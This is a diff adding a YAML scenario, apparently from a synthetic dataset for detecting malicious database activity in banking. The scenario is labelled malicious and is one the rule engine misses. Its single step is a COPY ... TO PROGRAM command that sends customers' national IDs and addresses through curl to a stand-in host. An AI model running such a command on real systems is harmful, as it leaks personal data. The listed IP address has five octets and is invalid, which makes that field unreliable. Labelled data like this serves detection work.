@@ -1,0 +1,30 @@
+scenario_id: gen_banking_94_copy_to_program_mal_2668m
+family_id: gen_banking_94_copy_to_program_fam_2668
+domain: banking
+time_of_day: 02:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT national_id, address FROM customers) TO PROGRAM 'gzip | curl
+      -sX POST https://warehouse-sync.datasink.example/ingest --data-binary @-'
+    connects_to:
+      ip: 185.220.101.214.169
+      port: 9001
+matched_pair_id: gen_banking_94_copy_to_program_pair_2668
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
